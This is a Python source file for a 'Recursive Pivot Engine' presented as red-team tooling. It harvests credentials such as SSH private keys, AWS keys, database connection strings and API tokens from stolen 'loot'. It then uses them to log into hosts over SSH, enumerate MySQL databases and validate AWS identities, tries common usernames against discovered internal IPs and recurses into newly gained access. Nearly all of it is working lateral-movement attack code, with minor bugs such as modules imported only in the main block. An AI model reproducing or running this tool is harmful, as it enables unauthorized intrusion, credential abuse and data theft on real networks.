#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Recursive Pivot Engine (Celah di Dalam Celah) for HLFA Tools
Principal Red Team Developer Implementation

This engine extracts credentials from loot, performs real network pivots,
and recursively explores new access points up to a specified depth.

REQUIRED LIBRARIES:
- httpx (async HTTP requests)
- paramiko (SSH pivot)
- pymysql (MySQL database pivot)
- boto3 (AWS cloud pivot)
- rich (terminal UI)
"""

import re
import asyncio
from typing import Dict, List, Any, Optional, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs

# Third-party imports
import httpx
import paramiko
import pymysql
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
from rich.console import Console
from rich.panel import Panel
from rich.tree import Tree
from rich.logging import RichHandler
import logging

# Configure logging with Rich
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[RichHandler(rich_tracebacks=True)]
)

console = Console()


# =============================================================================
# CUSTOM EXCEPTIONS
# =============================================================================

class PivotFailedException(Exception):
    """Raised when a pivot attempt fails with connection or authentication error."""
    
    def __init__(self, protocol: str, target: str, original_error: str):
        self.protocol = protocol
        self.target = target
        self.original_error = original_error
        super().__init__(f"[{protocol}] Pivot to {target} FAILED: {original_error}")


class ExtractionFailedException(Exception):
    """Raised when loot extraction yields no valid credentials."""
    pass


# =============================================================================
# CLASS 1: LootExtractor
# =============================================================================

class LootExtractor:
    """
    Extracts credentials, URLs, IPs, tokens, and keys from raw text content.
    Uses regex patterns to detect real-world credential formats.
    """
    
    # Regex patterns for credential extraction
    PATTERNS = {
        'mysql_connection_string': re.compile(
            r'mysql://([^:]+):([^@]+)@([^\s:/]+)(?::(\d+))?(?:/([^\s?#]+))?',
            re.IGNORECASE
        ),
        'postgres_connection_string': re.compile(
            r'postgres(?:ql)?://([^:]+):([^@]+)@([^\s:/]+)(?::(\d+))?(?:/([^\s?#]+))?',
            re.IGNORECASE
        ),
        'aws_access_key': re.compile(
            r'(AKIA[0-9A-Z]{16})',
            re.IGNORECASE
        ),
        'aws_secret_key': re.compile(
            r'(?<![A-Za-z0-9/+=])([A-Za-z0-9/+=]{40})(?![A-Za-z0-9/+=])',
            re.IGNORECASE
        ),
        'ssh_private_key': re.compile(
            r'(-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----)',
            re.MULTILINE
        ),
        'ip_address_internal': re.compile(
            r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b'
        ),
        'internal_url': re.compile(
            r'https?://([a-zA-Z0-9.-]+\.(?:internal|local|lan|corp|priv|intra)[a-zA-Z0-9.-]*(?:[/:]\S*)?)',
            re.IGNORECASE
        ),
        'jwt_token': re.compile(
            r'(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)',
            re.IGNORECASE
        ),
        'bearer_token': re.compile(
            r'[Bb]earer\s+([A-Za-z0-9_-]{20,})',
            re.IGNORECASE
        ),
        'api_key_stripe': re.compile(
            r'(sk_live_[A-Za-z0-9]{24,})',
            re.IGNORECASE
        ),
        'api_key_generic': re.compile(
            r'(?:api[_-]?key|apikey|api_secret)["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]{16,})["\']?',
            re.IGNORECASE
        ),
        'github_token': re.compile(
            r'(ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|ghu_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}|ghr_[A-Za-z0-9]{36})',
            re.IGNORECASE
        ),
        'slack_token': re.compile(
            r'(xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*)',
            re.IGNORECASE
        ),
        'google_api_key': re.compile(
            r'(AIza[0-9A-Za-z_-]{35})',
            re.IGNORECASE
        ),
        'password_in_url': re.compile(
            r'https?://[^:]+:([^@]+)@([^\s:/]+)(?::(\d+))?',
            re.IGNORECASE
        ),
        'base64_encoded_secret': re.compile(
            r'(?:secret|password|pass|pwd)["\']?\s*[:=]\s*["\']?([A-Za-z0-9+/]{20,}={0,2})["\']?',
            re.IGNORECASE
        ),
    }
    
    def __init__(self):
        self.extracted_data: Dict[str, List[Any]] = {
            'mysql_credentials': [],
            'postgres_credentials': [],
            'aws_access_keys': [],
            'aws_secret_keys': [],
            'ssh_keys': [],
            'internal_ips': [],
            'internal_urls': [],
            'jwt_tokens': [],
            'bearer_tokens': [],
            'stripe_keys': [],
            'generic_api_keys': [],
            'github_tokens': [],
            'slack_tokens': [],
            'google_api_keys': [],
            'passwords_from_url': [],
            'base64_secrets': [],
        }
    
    def extract(self, content: str, source_name: str = "unknown") -> Dict[str, List[Any]]:
        """
        Extract all credentials and sensitive data from the given content.
        
        Args:
            content: Raw string content (response body, file content, config)
            source_name: Name of the source for tracking purposes
            
        Returns:
            Dictionary with categorized extracted credentials
        """
        if not content or not isinstance(content, str):
            raise ExtractionFailedException(f"No valid content to extract from source: {source_name}")
        
        # Reset extracted data for fresh extraction
        self.extracted_data = {key: [] for key in self.extracted_data.keys()}
        
        # Extract MySQL connection strings
        for match in self.PATTERNS['mysql_connection_string'].finditer(content):
            self.extracted_data['mysql_credentials'].append({
                'username': match.group(1),
                'password': match.group(2),
                'host': match.group(3),
                'port': int(match.group(4)) if match.group(4) else 3306,
                'database': match.group(5) if match.group(5) else None,
                'source': source_name
            })
        
        # Extract PostgreSQL connection strings
        for match in self.PATTERNS['postgres_connection_string'].finditer(content):
            self.extracted_data['postgres_credentials'].append({
                'username': match.group(1),
                'password': match.group(2),
                'host': match.group(3),
                'port': int(match.group(4)) if match.group(4) else 5432,
                'database': match.group(5) if match.group(5) else None,
                'source': source_name
            })
        
        # Extract AWS Access Keys
        for match in self.PATTERNS['aws_access_key'].finditer(content):
            self.extracted_data['aws_access_keys'].append({
                'access_key': match.group(1),
                'source': source_name
            })
        
        # Extract potential AWS Secret Keys (40 char alphanumeric with +/=)
        for match in self.PATTERNS['aws_secret_key'].finditer(content):
            secret = match.group(1)
            # Filter out false positives
            if any(c in secret for c in ['/', '+']) or secret.endswith('='):
                self.extracted_data['aws_secret_keys'].append({
                    'secret_key': secret,
                    'source': source_name
                })
        
        # Extract SSH Private Keys
        for match in self.PATTERNS['ssh_private_key'].finditer(content):
            self.extracted_data['ssh_keys'].append({
                'key_content': match.group(1),
                'key_type': 'RSA' if 'RSA' in match.group(1) else 'DSA' if 'DSA' in match.group(1) else 'EC' if 'EC' in match.group(1) else 'OPENSSH',
                'source': source_name
            })
        
        # Extract Internal IP Addresses
        for match in self.PATTERNS['ip_address_internal'].finditer(content):
            ip = match.group(1)
            if ip not in [item['ip'] for item in self.extracted_data['internal_ips']]:
                self.extracted_data['internal_ips'].append({
                    'ip': ip,
                    'source': source_name
                })
        
        # Extract Internal URLs
        for match in self.PATTERNS['internal_url'].finditer(content):
            self.extracted_data['internal_urls'].append({
                'url': match.group(1),
                'full_url': match.group(0),
                'source': source_name
            })
        
        # Extract JWT Tokens
        for match in self.PATTERNS['jwt_token'].finditer(content):
            self.extracted_data['jwt_tokens'].append({
                'token': match.group(1),
                'source': source_name
            })
        
        # Extract Bearer Tokens
        for match in self.PATTERNS['bearer_token'].finditer(content):
            self.extracted_data['bearer_tokens'].append({
                'token': match.group(1),
                'source': source_name
            })
        
        # Extract Stripe API Keys
        for match in self.PATTERNS['api_key_stripe'].finditer(content):
            self.extracted_data['stripe_keys'].append({
                'key': match.group(1),
                'source': source_name
            })
        
        # Extract Generic API Keys
        for match in self.PATTERNS['api_key_generic'].finditer(content):
            self.extracted_data['generic_api_keys'].append({
                'key': match.group(1),
                'source': source_name
            })
        
        # Extract GitHub Tokens
        for match in self.PATTERNS['github_token'].finditer(content):
            self.extracted_data['github_tokens'].append({
                'token': match.group(1),
                'source': source_name
            })
        
        # Extract Slack Tokens
        for match in self.PATTERNS['slack_token'].finditer(content):
            self.extracted_data['slack_tokens'].append({
                'token': match.group(1),
                'source': source_name
            })
        
        # Extract Google API Keys
        for match in self.PATTERNS['google_api_key'].finditer(content):
            self.extracted_data['google_api_keys'].append({
                'key': match.group(1),
                'source': source_name
            })
        
        # Extract Passwords from URLs
        for match in self.PATTERNS['password_in_url'].finditer(content):
            self.extracted_data['passwords_from_url'].append({
                'password': match.group(1),
                'host': match.group(2),
                'port': match.group(3) if match.group(3) else None,
                'source': source_name
            })
        
        # Extract Base64 encoded secrets
        for match in self.PATTERNS['base64_encoded_secret'].finditer(content):
            self.extracted_data['base64_secrets'].append({
                'secret': match.group(1),
                'source': source_name
            })
        
        return self.extracted_data
    
    def get_pivot_candidates(self) -> Dict[str, List[Any]]:
        """
        Return only credentials that can be used for immediate pivoting.
        Filters out tokens and keys that require specific API endpoints.
        """
        pivot_candidates = {
            'ssh': self.extracted_data.get('ssh_keys', []),
            'mysql': self.extracted_data.get('mysql_credentials', []),
            'aws': [],
            'hosts': self.extracted_data.get('internal_ips', []),
        }
        
        # Combine AWS access and secret keys if both present
        access_keys = self.extracted_data.get('aws_access_keys', [])
        secret_keys = self.extracted_data.get('aws_secret_keys', [])
        
        for ak in access_keys:
            for sk in secret_keys:
                if ak.get('source') == sk.get('source'):
                    pivot_candidates['aws'].append({
                        'access_key': ak['access_key'],
                        'secret_key': sk['secret_key'],
                        'source': ak['source']
                    })
        
        return pivot_candidates


# =============================================================================
# CLASS 2: ProtocolRouter
# =============================================================================

class ProtocolRouter:
    """
    Performs REAL network connections using actual Python libraries.
    Handles SSH, MySQL, and AWS connections with proper error handling.
    """
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.connection_cache: Dict[str, Any] = {}
    
    def connect_ssh(self, host: str, port: int, username: str, 
                    key_or_password: str, key_type: str = "password") -> Dict[str, Any]:
        """
        Establish REAL SSH connection using paramiko.
        Execute 'id && hostname' command and return actual output.
        
        Args:
            host: Target hostname or IP
            port: SSH port (default 22)
            username: SSH username
            key_or_password: Either password string or private key content
            key_type: 'password' or 'key'
            
        Returns:
            Dictionary with connection status and command output
        """
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            if key_type == "key":
                # Load private key from string
                key_file = paramiko.RSAKey.from_private_key(io.StringIO(key_or_password))
                ssh_client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    pkey=key_file,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            else:
                # Use password authentication
                ssh_client.connect(
                    hostname=host,
                    port=port,
                    username=username,
                    password=key_or_password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # Execute command to verify access
            stdin, stdout, stderr = ssh_client.exec_command("id && hostname", timeout=self.timeout)
            
            exit_status = stdout.channel.recv_exit_status()
            output = stdout.read().decode('utf-8', errors='replace').strip()
            error_output = stderr.read().decode('utf-8', errors='replace').strip()
            
            connection_key = f"ssh://{username}@{host}:{port}"
            self.connection_cache[connection_key] = ssh_client
            
            return {
                'status': 'success',
                'protocol': 'SSH',
                'target': f"{host}:{port}",
                'username': username,
                'exit_code': exit_status,
                'stdout': output,
                'stderr': error_output,
                'client': ssh_client
            }
            
        except paramiko.AuthenticationException as e:
            ssh_client.close()
            raise PivotFailedException("SSH", f"{host}:{port}", f"Authentication failed: {str(e)}")
        except paramiko.SSHException as e:
            ssh_client.close()
            raise PivotFailedException("SSH", f"{host}:{port}", f"SSH error: {str(e)}")
        except socket.timeout:
            ssh_client.close()
            raise PivotFailedException("SSH", f"{host}:{port}", "Connection timed out")
        except ConnectionRefusedError:
            ssh_client.close()
            raise PivotFailedException("SSH", f"{host}:{port}", "Connection refused")
        except Exception as e:
            ssh_client.close()
            raise PivotFailedException("SSH", f"{host}:{port}", f"Unexpected error: {str(e)}")
    
    def connect_mysql(self, host: str, port: int, username: str, 
                      password: str, database: Optional[str] = None) -> Dict[str, Any]:
        """
        Establish REAL MySQL connection using pymysql.
        Execute 'SHOW DATABASES' and return actual database list.
        
        Args:
            host: MySQL server hostname or IP
            port: MySQL port (default 3306)
            username: MySQL username
            password: MySQL password
            database: Optional initial database to connect to
            
        Returns:
            Dictionary with connection status and list of databases
        """
        connection = None
        try:
            connection = pymysql.connect(
                host=host,
                port=port,
                user=username,
                password=password,
                database=database if database else 'mysql',
                connect_timeout=self.timeout,
                cursorclass=pymysql.cursors.DictCursor
            )
            
            with connection.cursor() as cursor:
                cursor.execute("SHOW DATABASES")
                databases = [row['Database'] for row in cursor.fetchall()]
                
                # Get additional info
                cursor.execute("SELECT VERSION() as version, USER() as user")
                info = cursor.fetchone()
            
            connection_key = f"mysql://{username}@{host}:{port}"
            self.connection_cache[connection_key] = connection
            
            return {
                'status': 'success',
                'protocol': 'MySQL',
                'target': f"{host}:{port}",
                'username': username,
                'databases': databases,
                'server_version': info['version'] if info else 'unknown',
                'current_user': info['user'] if info else 'unknown',
                'connection': connection
            }
            
        except pymysql.err.OperationalError as e:
            if connection:
                connection.close()
            raise PivotFailedException("MySQL", f"{host}:{port}", f"Operational error: {str(e)}")
        except pymysql.err.AccessDeniedError as e:
            if connection:
                connection.close()
            raise PivotFailedException("MySQL", f"{host}:{port}", f"Access denied: {str(e)}")
        except pymysql.err.MySQLError as e:
            if connection:
                connection.close()
            raise PivotFailedException("MySQL", f"{host}:{port}", f"MySQL error: {str(e)}")
        except socket.timeout:
            if connection:
                connection.close()
            raise PivotFailedException("MySQL", f"{host}:{port}", "Connection timed out")
        except ConnectionRefusedError:
            if connection:
                connection.close()
            raise PivotFailedException("MySQL", f"{host}:{port}", "Connection refused")
        except Exception as e:
            if connection:
                connection.close()
            raise PivotFailedException("MySQL", f"{host}:{port}", f"Unexpected error: {str(e)}")
    
    def connect_aws(self, access_key: str, secret_key: str, 
                    region: str = "us-east-1") -> Dict[str, Any]:
        """
        Validate REAL AWS credentials using boto3.
        Call get_caller_identity() via STS and return actual ARN.
        
        Args:
            access_key: AWS Access Key ID (AKIA...)
            secret_key: AWS Secret Access Key
            region: AWS region for the client
            
        Returns:
            Dictionary with validation status and caller identity
        """
        try:
            # Create STS client with provided credentials
            sts_client = boto3.client(
                'sts',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region
            )
            
            # Get caller identity to validate credentials
            response = sts_client.get_caller_identity()
            
            # Try to get additional account info
            iam_client = boto3.client(
                'iam',
                aws_access_key_id=access_key,
                aws_secret_access_key=secret_key,
                region_name=region
            )
            
            user_info = None
            try:
                user_response = iam_client.get_user()
                user_info = {
                    'user_name': user_response['User']['UserName'],
                    'user_arn': user_response['User']['Arn'],
                    'create_date': str(user_response['User']['CreateDate']),
                    'mfa_devices': user_response['User'].get('MFADeviceSummaryList', [])
                }
            except ClientError:
                # User might not have IAM permissions, which is fine
                pass
            
            return {
                'status': 'success',
                'protocol': 'AWS',
                'account_id': response['Account'],
                'user_id': response['UserId'],
                'arn': response['Arn'],
                'region': region,
                'user_details': user_info,
                'credentials_valid': True
            }
            
        except NoCredentialsError as e:
            raise PivotFailedException("AWS", "STS", f"No credentials provided: {str(e)}")
        except ClientError as e:
            error_code = e.response.get('Error', {}).get('Code', 'Unknown')
            error_message = e.response.get('Error', {}).get('Message', str(e))
            raise PivotFailedException("AWS", "STS", f"AWS ClientError ({error_code}): {error_message}")
        except Exception as e:
            raise PivotFailedException("AWS", "STS", f"Unexpected error: {str(e)}")
    
    def close_all_connections(self):
        """Close all cached connections to clean up resources."""
        for conn_key, conn in self.connection_cache.items():
            try:
                if hasattr(conn, 'close'):
                    conn.close()
            except Exception:
                pass
        self.connection_cache.clear()


# =============================================================================
# CLASS 3: RecursivePivotEngine
# =============================================================================

@dataclass
class PivotResult:
    """Stores results from a single pivot attempt."""
    depth: int
    protocol: str
    target: str
    success: bool
    data: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None
    timestamp: str = field(default_factory=lambda: "")
    
    def __post_init__(self):
        if not self.timestamp:
            from datetime import datetime
            self.timestamp = datetime.now().isoformat()


@dataclass
class PivotState:
    """Tracks the state of recursive pivot operations."""
    current_depth: int = 0
    max_depth: int = 5
    visited_nodes: Set[str] = field(default_factory=set)
    successful_pivots: List[PivotResult] = field(default_factory=list)
    failed_pivots: List[PivotResult] = field(default_factory=list)
    discovered_credentials: Dict[str, List[Any]] = field(default_factory=dict)
    
    def is_visited(self, node_id: str) -> bool:
        return node_id in self.visited_nodes
    
    def mark_visited(self, node_id: str):
        self.visited_nodes.add(node_id)
    
    def add_successful_pivot(self, result: PivotResult):
        self.successful_pivots.append(result)
        self.mark_visited(f"{result.protocol}:{result.target}")
    
    def add_failed_pivot(self, result: PivotResult):
        self.failed_pivots.append(result)


class RecursivePivotEngine:
    """
    Main orchestrator for recursive pivot operations.
    Extracts credentials from loot, attempts pivots, and recurses into new access.
    """
    
    def __init__(self, max_depth: int = 5, timeout: int = 10):
        self.max_depth = max_depth
        self.timeout = timeout
        self.loot_extractor = LootExtractor()
        self.protocol_router = ProtocolRouter(timeout=timeout)
        self.state = PivotState(max_depth=max_depth)
        self.console = Console()
        
        # Track all discovered loot across all depths
        self.all_discovered_loot: List[Dict[str, Any]] = []
    
    def _generate_node_id(self, protocol: str, host: str, port: int) -> str:
        """Generate unique identifier for a target node."""
        return f"{protocol}:{host}:{port}"
    
    def _print_progress(self, message: str, style: str = "bold green"):
        """Print formatted progress message using Rich."""
        self.console.print(f"[{style}] {message}[/]")
    
    def _print_panel(self, title: str, content: str, style: str = "green"):
        """Print content in a Rich panel."""
        panel = Panel(content, title=title, border_style=style)
        self.console.print(panel)
    
    def process_loot(self, content: str, source_name: str = "unknown") -> Dict[str, List[Any]]:
        """
        Process raw loot content and extract credentials.
        
        Args:
            content: Raw string content from previous exploitation
            source_name: Identifier for the source of this loot
            
        Returns:
            Dictionary of extracted credentials
        """
        try:
            extracted = self.loot_extractor.extract(content, source_name)
            
            # Store for recursive processing
            self.all_discovered_loot.append({
                'source': source_name,
                'extracted': extracted,
                'timestamp': PivotResult(depth=0, protocol="", target="", success=False).timestamp
            })
            
            # Update state with discovered credentials
            for category, items in extracted.items():
                if items:
                    if category not in self.state.discovered_credentials:
                        self.state.discovered_credentials[category] = []
                    self.state.discovered_credentials[category].extend(items)
            
            return extracted
            
        except ExtractionFailedException as e:
            self._print_progress(f"Extraction failed: {str(e)}", "red")
            return {}
    
    def attempt_ssh_pivot(self, host: str, port: int, username: str,
                         credential: Dict[str, Any], depth: int) -> Optional[PivotResult]:
        """Attempt SSH pivot with given credentials."""
        node_id = self._generate_node_id("SSH", host, port)
        
        if self.state.is_visited(node_id):
            return None
        
        try:
            key_content = credential.get('key_content', '')
            result = self.protocol_router.connect_ssh(
                host=host,
                port=port,
                username=username,
                key_or_password=key_content,
                key_type="key"
            )
            
            pivot_result = PivotResult(
                depth=depth,
                protocol="SSH",
                target=f"{host}:{port}",
                success=True,
                data={
                    'username': username,
                    'output': result['stdout'],
                    'exit_code': result['exit_code']
                }
            )
            
            self.state.add_successful_pivot(pivot_result)
            self._print_progress(
                f"Depth {depth}: SSH Pivot to {host}:{port} SUCCESS - User: {username}",
                "bold green"
            )
            
            # Process output for new credentials
            if result['stdout']:
                new_loot = self.process_loot(result['stdout'], f"ssh_output_{host}_{port}")
            
            return pivot_result
            
        except PivotFailedException as e:
            pivot_result = PivotResult(
                depth=depth,
                protocol="SSH",
                target=f"{host}:{port}",
                success=False,
                data={},
                error=str(e)
            )
            self.state.add_failed_pivot(pivot_result)
            self._print_progress(
                f"Depth {depth}: SSH Pivot to {host}:{port} FAILED - {e.original_error}",
                "bold red"
            )
            return pivot_result
    
    def attempt_mysql_pivot(self, host: str, port: int, username: str,
                           password: str, database: Optional[str], depth: int) -> Optional[PivotResult]:
        """Attempt MySQL pivot with given credentials."""
        node_id = self._generate_node_id("MySQL", host, port)
        
        if self.state.is_visited(node_id):
            return None
        
        try:
            result = self.protocol_router.connect_mysql(
                host=host,
                port=port,
                username=username,
                password=password,
                database=database
            )
            
            pivot_result = PivotResult(
                depth=depth,
                protocol="MySQL",
                target=f"{host}:{port}",
                success=True,
                data={
                    'username': username,
                    'databases': result['databases'],
                    'version': result['server_version'],
                    'current_user': result['current_user']
                }
            )
            
            self.state.add_successful_pivot(pivot_result)
            self._print_progress(
                f"Depth {depth}: MySQL Pivot to {host}:{port} SUCCESS - Databases: {len(result['databases'])}",
                "bold green"
            )
            
            # Store database info for potential future use
            db_info = f"MySQL Server v{result['server_version']} on {host}:{port}\n"
            db_info += f"User: {result['current_user']}\n"
            db_info += f"Databases: {', '.join(result['databases'])}"
            self.process_loot(db_info, f"mysql_enumeration_{host}_{port}")
            
            return pivot_result
            
        except PivotFailedException as e:
            pivot_result = PivotResult(
                depth=depth,
                protocol="MySQL",
                target=f"{host}:{port}",
                success=False,
                data={},
                error=str(e)
            )
            self.state.add_failed_pivot(pivot_result)
            self._print_progress(
                f"Depth {depth}: MySQL Pivot to {host}:{port} FAILED - {e.original_error}",
                "bold red"
            )
            return pivot_result
    
    def attempt_aws_pivot(self, access_key: str, secret_key: str,
                         region: str, depth: int) -> Optional[PivotResult]:
        """Attempt AWS pivot with given credentials."""
        node_id = f"AWS:{access_key}:{region}"
        
        if self.state.is_visited(node_id):
            return None
        
        try:
            result = self.protocol_router.connect_aws(
                access_key=access_key,
                secret_key=secret_key,
                region=region
            )
            
            pivot_result = PivotResult(
                depth=depth,
                protocol="AWS",
                target=result['arn'],
                success=True,
                data={
                    'account_id': result['account_id'],
                    'user_id': result['user_id'],
                    'arn': result['arn'],
                    'region': result['region'],
                    'user_details': result['user_details']
                }
            )
            
            self.state.add_successful_pivot(pivot_result)
            self._print_progress(
                f"Depth {depth}: AWS Pivot SUCCESS - Account: {result['account_id']}, ARN: {result['arn']}",
                "bold green"
            )
            
            # Store AWS info for potential future use
            aws_info = f"AWS Account: {result['account_id']}\n"
            aws_info += f"ARN: {result['arn']}\n"
            aws_info += f"Region: {result['region']}\n"
            if result['user_details']:
                aws_info += f"IAM User: {result['user_details'].get('user_name', 'N/A')}"
            self.process_loot(aws_info, f"aws_enumeration_{result['account_id']}")
            
            return pivot_result
            
        except PivotFailedException as e:
            pivot_result = PivotResult(
                depth=depth,
                protocol="AWS",
                target=access_key,
                success=False,
                data={},
                error=str(e)
            )
            self.state.add_failed_pivot(pivot_result)
            self._print_progress(
                f"Depth {depth}: AWS Pivot FAILED - {e.original_error}",
                "bold red"
            )
            return pivot_result
    
    def execute_depth(self, depth: int, candidates: Dict[str, List[Any]]):
        """Execute all pivot attempts for a given depth."""
        self._print_panel(
            f"Executing Depth {depth}/{self.max_depth}",
            f"SSH candidates: {len(candidates.get('ssh', []))}\n"
            f"MySQL candidates: {len(candidates.get('mysql', []))}\n"
            f"AWS candidates: {len(candidates.get('aws', []))}\n"
            f"Host candidates: {len(candidates.get('hosts', []))}",
            "cyan"
        )
        
        # Attempt SSH pivots
        for ssh_credential in candidates.get('ssh', []):
            key_content = ssh_credential.get('key_content', '')
            if not key_content:
                continue
            
            # Try common usernames if not specified
            usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'centos']
            
            for username in usernames:
                for host_info in candidates.get('hosts', []):
                    host = host_info.get('ip', '')
                    port = 22
                    
                    if not host:
                        continue
                    
                    self.attempt_ssh_pivot(host, port, username, ssh_credential, depth)
        
        # Attempt MySQL pivots
        for mysql_cred in candidates.get('mysql', []):
            host = mysql_cred.get('host', '')
            port = mysql_cred.get('port', 3306)
            username = mysql_cred.get('username', '')
            password = mysql_cred.get('password', '')
            database = mysql_cred.get('database')
            
            if not all([host, username, password]):
                continue
            
            self.attempt_mysql_pivot(host, port, username, password, database, depth)
        
        # Attempt AWS pivots
        for aws_cred in candidates.get('aws', []):
            access_key = aws_cred.get('access_key', '')
            secret_key = aws_cred.get('secret_key', '')
            
            if not all([access_key, secret_key]):
                continue
            
            regions = ['us-east-1', 'us-west-2', 'eu-west-1', 'ap-southeast-1']
            
            for region in regions:
                self.attempt_aws_pivot(access_key, secret_key, region, depth)
    
    def run(self, initial_loot: Dict[str, Any]) -> PivotState:
        """
        Main entry point for recursive pivot operations.
        
        Args:
            initial_loot: Dictionary containing initial credentials/data
                         Expected format: {'content': str, 'source': str}
                         
        Returns:
            PivotState object containing all results
        """
        self._print_panel(
            "🚀 Recursive Pivot Engine Started",
            f"Max Depth: {self.max_depth}\nTimeout: {self.timeout}s",
            "bold magenta"
        )
        
        # Process initial loot
        if 'content' in initial_loot:
            content = initial_loot['content']
            source = initial_loot.get('source', 'initial')
            self.process_loot(content, source)
        
        # Also check for pre-extracted credentials
        if 'credentials' in initial_loot:
            creds = initial_loot['credentials']
            for category, items in creds.items():
                if items:
                    if category not in self.state.discovered_credentials:
                        self.state.discovered_credentials[category] = []
                    self.state.discovered_credentials[category].extend(items)
        
        # Main recursion loop
        while self.state.current_depth < self.max_depth:
            self.state.current_depth += 1
            
            self._print_progress(
                f"\n{'='*60}\nStarting Depth {self.state.current_depth}\n{'='*60}",
                "bold cyan"
            )
            
            # Get pivot candidates from all discovered credentials
            candidates = self.loot_extractor.get_pivot_candidates()
            
            # Check if we have any candidates to work with
            total_candidates = sum(len(v) for v in candidates.values())
            if total_candidates == 0:
                self._print_progress(
                    f"No pivot candidates found at depth {self.state.current_depth}. Stopping.",
                    "yellow"
                )
                break
            
            # Execute pivots for this depth
            self.execute_depth(self.state.current_depth, candidates)
            
            # Check if we made any successful pivots
            successful_at_this_depth = [
                p for p in self.state.successful_pivots 
                if p.depth == self.state.current_depth
            ]
            
            if not successful_at_this_depth:
                self._print_progress(
                    f"No successful pivots at depth {self.state.current_depth}. Stopping.",
                    "yellow"
                )
                break
        
        # Print final summary
        self._print_summary()
        
        return self.state
    
    def _print_summary(self):
        """Print final summary of all pivot operations."""
        self.console.print("\n" + "="*60)
        self._print_panel(
            "📊 PIVOT ENGINE SUMMARY",
            f"Total Depths Explored: {self.state.current_depth}\n"
            f"Successful Pivots: {len(self.state.successful_pivots)}\n"
            f"Failed Pivots: {len(self.state.failed_pivots)}\n"
            f"Unique Nodes Visited: {len(self.state.visited_nodes)}",
            "bold blue"
        )
        
        if self.state.successful_pivots:
            tree = Tree("✅ Successful Pivots")
            for pivot in self.state.successful_pivots:
                branch = tree.add(f"[green]{pivot.protocol} -> {pivot.target}[/]")
                branch.add(f"Depth: {pivot.depth}")
                if pivot.data.get('username'):
                    branch.add(f"Username: {pivot.data['username']}")
                if pivot.data.get('databases'):
                    branch.add(f"Databases: {', '.join(pivot.data['databases'][:5])}")
                if pivot.data.get('arn'):
                    branch.add(f"ARN: {pivot.data['arn']}")
            self.console.print(tree)
        
        # Clean up connections
        self.protocol_router.close_all_connections()


# =============================================================================
# MAIN EXECUTION (Example Usage)
# =============================================================================

if __name__ == "__main__":
    import io
    import socket
    
    # Example: Initialize and run the engine with sample loot
    # In real usage, initial_loot would come from previous exploitation
    
    sample_loot_content = """
    # Database Configuration
    DB_CONNECTION=mysql://admin:SuperSecret123@192.168.1.100:3306/production
    
    # AWS Credentials found in config file
    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    
    # Internal services
    API_ENDPOINT=http://api.internal.company.com/v1/users
    ADMIN_PANEL=https://admin.corp.local/dashboard
    
    # Found SSH key in backup
    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy...
    -----END RSA PRIVATE KEY-----
    
    # JWT Token from response header
    Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U
    
    # Internal IP addresses discovered
    Server running on 10.0.0.5
    Database cluster: 10.0.0.10, 10.0.0.11
    """
    
    # Create engine instance
    engine = RecursivePivotEngine(max_depth=3, timeout=10)
    
    # Prepare initial loot
    initial_loot = {
        'content': sample_loot_content,
        'source': 'initial_exploitation'
    }
    
    # Run the recursive pivot engine
    try:
        final_state = engine.run(initial_loot)
        
        # Output results programmatically
        print("\n=== PROGRAMMATIC OUTPUT ===")
        print(f"Successful pivots: {len(final_state.successful_pivots)}")
        for pivot in final_state.successful_pivots:
            print(f"  - {pivot.protocol}: {pivot.target} at depth {pivot.depth}")
        
        print(f"\nFailed pivots: {len(final_state.failed_pivots)}")
        for pivot in final_state.failed_pivots:
            print(f"  - {pivot.protocol}: {pivot.target} - {pivot.error}")
            
    except KeyboardInterrupt:
        console.print("\n[yellow]Operation cancelled by user.[/]")
    except Exception as e:
        console.print(f"\n[red]Fatal error: {str(e)}[/]")
        raise
